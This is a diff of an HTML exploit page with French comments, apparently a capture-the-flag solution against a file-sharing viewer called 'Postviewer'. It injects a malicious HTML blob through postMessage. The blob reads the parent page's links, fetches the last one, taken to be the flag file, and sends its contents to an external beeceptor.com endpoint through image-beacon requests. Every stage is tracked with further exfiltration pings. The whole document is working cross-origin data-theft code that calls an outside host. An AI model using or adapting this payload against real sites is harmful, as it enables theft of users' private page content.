@@ -1,34 +1,55 @@
 <html><body><script>
+/* ————— 0) ping immédiat ————— */
+new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';
+
 (async () => {
-  /* 1. blob html */
-  const epic = 
-    <script>
-      (async () => {
-        try {
-          const links = [...parent.document.querySelectorAll('a')];
-          const a = links.find(x => /flag\\.txt$/.test(x.textContent));
+/* ————— 1) blob HTML malveillant ————— */
+const epic = `
+  <script>
+    (async () => {
+      /* ping « start » : le blob s’exécute bien */
+      new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=blob_start';
+      try {
+        const links = [...parent.document.querySelectorAll('a')];
+        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=links_' + links.length;
 
-          if (!a) {
-            new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
-            return;
-          }
-
-          const res = await fetch(a.href);
-          const txt = await res.text();
-
-          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=' + encodeURIComponent(txt);
-        } catch (e) {
-          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=error_' + encodeURIComponent(e.message);
+        if (!links.length) {
+          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=no_links';
+          return;
         }
-      })();
-    <\/script>;
 
-  const blob = new Blob([epic], { type: 'text/html' });
+        /* on tente le dernier lien (le flag est ajouté en dernier) */
+        const a = links[links.length - 1];
 
-  /* 2. postmessage vers la page index */
-  window.postMessage({
-    type: 'share',
-    files: [{ blob, name: 'epic.html', cached: false }]
-  }, '*');
+        if (!a) {
+          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
+          return;
+        }
+
+        /* ► méthode 1 : tentative fetch directe */
+        const res = await fetch(a.href.startsWith('#') ? a.href : a.href);
+        const txt = await res.text();
+        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=flag_' +
+                          encodeURIComponent(txt.slice(0,200)); /* tronqué */
+
+      } catch (e) {
+        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=error_' +
+                          encodeURIComponent(e.message);
+      } finally {
+        /* ping « done » quelles que soient les branches */
+        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=done';
+      }
+    })();
+  <\/script>`;
+
+/* ————— 2) on envoie le blob à la page Postviewer ————— */
+const blob = new Blob([epic], { type: 'text/html' });
+window.postMessage({
+  type: 'share',
+  files: [{ blob, name: 'epic.html', cached: false }]
+}, '*');
+
+/* ping après postMessage pour confirmer l’injection */
+new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
 })();
 </script></body></html>
